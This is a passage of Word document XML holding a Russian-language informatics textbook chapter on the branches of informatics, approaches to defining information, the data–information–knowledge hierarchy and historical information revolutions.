        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прикладная информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> занимается разработкой и применением информационных технологий для решения практических задач в различных предметных областях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные направления:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Программирование** — создание программного обеспечения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системное программирование** — разработка операционных систем, компиляторов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разработка приложений** — веб-приложения, мобильные приложения, настольное ПО</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Искусственный интеллект и машинное обучение** — нейронные сети, компьютерное зрение, обработка естественного языка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компьютерная графика и визуализация** — 2D/3D графика, игры, анимация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Базы данных** — проектирование, разработка и управление БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Информационные системы** — корпоративные системы, ERP, CRM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компьютерные сети и телекоммуникации** — проектирование и администрирование сетей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Информационная безопасность** — защита информации, этичный хакинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Биоинформатика** — анализ биологических данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вычислительная физика, химия** — моделирование физических процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Техническая информатика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Техническая информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> изучает технические средства реализации информационных процессов — компьютеры и другие устройства обработки информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные разделы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура ЭВМ** — организация и принципы работы компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микропроцессоры и микроконтроллеры** — устройство процессоров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Организация памяти** — иерархия памяти, кэш, виртуальная память</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Периферийные устройства** — устройства ввода-вывода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевое оборудование** — маршрутизаторы, коммутаторы, беспроводные технологии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Встраиваемые системы** — микроконтроллеры в бытовых приборах, автомобилях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Суперкомпьютеры и параллельные вычисления** — высокопроизводительные вычислительные системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Связь между разделами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разделы информатики тесно взаимосвязаны:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретическая информатика предоставляет **фундамент** для остальных разделов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Техническая информатика создаёт **аппаратную платформу** для реализации алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прикладная информатика использует **теорию и технику** для решения практических задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например, создание поисковой системы требует:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теории**: алгоритмы поиска и индексации, теория графов (для анализа связей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Техники**: серверы, системы хранения данных, сетевая инфраструктура</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладных знаний**: программирование, машинное обучение (ранжирование результатов), веб-технологии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Понятие информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема определения информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Термин "информация" является одним из наиболее фундаментальных и в то же время сложных для точного определения. Это связано с тем, что информация проявляется в различных контекстах и может рассматриваться с разных точек зрения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Можно выделить несколько подходов к определению информации:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Философский подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">С философской точки зрения </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это отражение реального мира, его объектов и процессов, выраженное в виде сигналов, знаков, сообщений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация как свойство материи</w:t>
      </w:r>
      <w:r>
        <w:t>: Некоторые философы считают, что информация является фундаментальным свойством материи наряду с веществом и энергией. Любой материальный объект содержит информацию о себе и может передавать эту информацию другим объектам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: Годовые кольца дерева содержат информацию о климатических условиях прошлых лет; след на песке — информация о том, кто и когда прошёл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Кибернетический подход (К. Шеннон)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кибернетика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — наука об управлении, связи и переработке информации в технических, биологических и социальных системах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">С точки зрения кибернетики, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сообщение, уменьшающее неопределённость (энтропию) у получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Этот подход лежит в основе </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>теории информации Клода Шеннона</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1948 г.), где информация измеряется в битах и связана с вероятностью событий. Мы подробно изучали это в главе 1.5 (формула Шеннона, энтропия).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевая идея</w:t>
      </w:r>
      <w:r>
        <w:t>: Информация — это то, что изменяет наше знание о мире, уменьшает неопределённость.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: Если вы знаете, что завтра может быть дождь или солнце с равной вероятностью, то прогноз погоды "завтра будет дождь" даёт вам 1 бит информации, так как убирает неопределённость выбора из двух вариантов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Семантический (смысловой) подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это смысл, содержание сообщения, которое понимается получателем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Этот подход подчёркивает, что информация неразрывно связана с её интерпретацией. Одни и те же данные могут нести разную информацию для разных получателей в зависимости от их знаний (тезауруса).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: Медицинский анализ крови содержит много информации для врача, но мало для пациента без медицинского образования. Формально данных одинаково, но семантическая информация различается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Этот аспект мы изучали в главе 1.5 как </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семантическую меру информации</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Прагматический подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это полезные сведения, влияющие на поведение получателя и помогающие ему достичь цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прагматический подход оценивает информацию с точки зрения её полезности, ценности для конкретного получателя в конкретной ситуации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: Информация о пробках на дорогах полезна (имеет высокую ценность) для водителя, который сейчас едет, но бесполезна для человека, находящегося дома. Информация о прошедших событиях может быть ценна для историка, но не актуальна для принятия решений сейчас.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Этот аспект соответствует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прагматической мере информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Бытовой подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В повседневной жизни </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сведения, знания, которые человек получает из окружающего мира через органы чувств или от других людей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: Новости, сообщения от друзей, показания приборов, дорожные знаки — всё это информация в бытовом смысле.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Обобщённое определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Учитывая различные подходы, можно дать следующее обобщённое определение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сведения об объектах и явлениях окружающего мира, их свойствах и состоянии, которые уменьшают неопределённость знаний об этих объектах и явлениях и могут быть представлены в виде, пригодном для восприятия, хранения, преобразования и передачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Данные, информация, знания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Важно различать следующие понятия:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это необработанные факты, сигналы, символы, которые фиксируются и передаются без учёта их смысла.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: "25", "Москва", набор чисел в таблице.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это данные, обработанные и представленные в форме, понятной получателю, имеющие для него смысл.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: "Температура воздуха в Москве 25°C" — данные превратились в информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Знания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это информация, осмысленная, систематизированная, встроенная в систему представлений человека о мире.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Понимание того, что 25°C — это комфортная температура для человека, что при такой температуре не нужна тёплая одежда — это знание.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Можно сказать, что существует иерархия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные → Информация → Знания → Мудрость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Информация в жизни человечества</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные революции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Развитие человеческой цивилизации неразрывно связано с развитием способов работы с информацией. Историки выделяют несколько </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>информационных революций</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — качественных скачков в технологиях работы с информацией, которые кардинально меняли общество.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Первая информационная революция: изобретение языка и письменности (3000-2000 лет до н.э.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Язык</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> позволил людям передавать сложную информацию друг другу, координировать действия, передавать опыт. Появление </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>письменности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (клинопись в Месопотамии, иероглифы в Египте) позволило:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фиксировать информацию на материальных носителях (глиняные таблички, папирус)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Передавать знания через пространство (отправлять письма) и время (будущим поколениям)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Накапливать знания (библиотеки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последствия</w:t>
      </w:r>
      <w:r>
        <w:t>: Возникли древние цивилизации, появилась возможность централизованного управления государствами, развилась наука и культура.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Вторая информационная революция: изобретение книгопечатания (XV век, И. Гутенберг, 1440-е гг.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Изобретение </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>печатного станка с подвижными литерами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Иоганном Гутенбергом произвело революцию в распространении информации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удешевление производства книг (рукописная книга стоила как дом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Массовое распространение знаний</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандартизация текстов (все экземпляры одинаковы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последствия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реформация (перевод Библии на национальные языки, печать религиозных трактатов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эпоха Просвещения, научная революция XVII века</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рост грамотности населения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Формирование единых национальных языков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ускорение научного прогресса за счёт обмена знаниями между учёными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Третья информационная революция: изобретение электричества и средств связи (конец XIX века)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Изобретение </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>телеграфа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (С. Морзе, 1837), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>телефона</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (А. Белл, 1876), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>радио</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Г. Маркони, А. Попов, 1895) и позже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>телевидения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1920-1930-е гг.) кардинально изменило скорость передачи информации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Практически мгновенная передача информации на большие расстояния</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преодоление географических барьеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возможность оперативного управления и координации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последствия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глобализация экономики (биржевые новости мгновенно влияют на рынки по всему миру)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменение характера войн (радиосвязь, координация войск)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Формирование массовой культуры через радио и телевидение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ускорение научно-технического прогресса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Четвёртая информационная революция: изобретение микропроцессорной техники и компьютеров (1970-е гг. — настоящее время)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Создание </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>микропроцессоров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Intel 4004, 1971), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>персональных компьютеров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1970-1980-е гг.), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сети Интернет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ARPANET, 1969; WWW, Т. Бернерс-Ли, 1989-1991) привело к:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматизации обработки информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Появлению цифровых форм представления информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глобальной связности через Интернет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возможности хранения и обработки огромных объёмов данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последствия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цифровая экономика, электронная коммерция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Социальные сети, изменение коммуникаций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дистанционное образование и работа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Искусственный интеллект, большие данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информационное общество</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Некоторые исследователи уже говорят о </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пятой информационной революции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, связанной с развитием </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>искусственного интеллекта</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>больших данных (Big Data)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>интернета вещей (IoT)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>квантовых компьютеров</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Информационное общество</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационное общество</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это общество, в котором большая часть населения занята получением, переработкой, передачей и хранением информации, а информация становится важнейшим ресурсом, превышающим по значению материальные и энергетические ресурсы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Признаки информационного общества:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Информация как стратегический ресурс**: Кто владеет информацией — владеет миром</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая доля ИКТ в экономике**: IT-компании (Google, Apple, Microsoft, Amazon) — крупнейшие корпорации мира</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Глобальные информационные сети**: Интернет связывает миллиарды людей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Информатизация всех сфер жизни**: От государственного управления до личных коммуникаций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
